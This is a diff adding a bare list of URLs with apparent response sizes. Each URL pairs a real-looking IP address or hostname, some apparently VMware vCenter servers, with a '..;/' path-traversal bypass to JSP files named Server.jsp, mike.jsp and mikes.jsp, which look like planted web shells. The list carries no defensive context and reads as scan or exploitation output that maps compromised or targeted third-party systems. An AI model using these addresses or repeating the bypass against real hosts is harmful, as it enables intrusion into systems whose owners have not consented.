@@ -1,0 +1,25 @@
+http://8.130.54.193:8082/idm/..;/Server.jsp        57426
+http://47.243.108.228:89/idm/..;/Server.jsp        57426
+https://202.105.131.113/idm/..;/Server.jsp        60
+https://vcsa67-bj-hz.aijk.net/idm/..;/Server.jsp        60
+https://vcsa.corp.hfmxh.com:1443/idm/..;/Server.jsp        65
+https://vcadmin.winindustry.com/idm/..;/Server.jsp        60
+http://47.104.90.222:82/idm/..;/Server.jsp        57426
+http://119.12.170.85:8083/idm/..;/Server.jsp        57426
+
+
+
+
+http://47.104.153.29:1098/idm/..;/mike.jsp        57426
+https://202.105.131.113/idm/..;/mike.jsp        60
+http://8.130.100.116:8001/idm/..;/mike.jsp        57426
+https://vcsa67-bj-hz.aijk.net/idm/..;/mike.jsp        60
+https://vcsa.corp.hfmxh.com:1443/idm/..;/mike.jsp        65
+https://vcadmin.winindustry.com/idm/..;/mike.jsp        60
+http://47.243.126.246:8009/idm/..;/mike.jsp        57426
+
+
+
+https://202.105.131.113/idm/..;/mikes.jsp        150
+https://vcsa.corp.hfmxh.com:1443/idm/..;/mikes.jsp        154
+https://vcadmin.winindustry.com/idm/..;/mikes.jsp        149
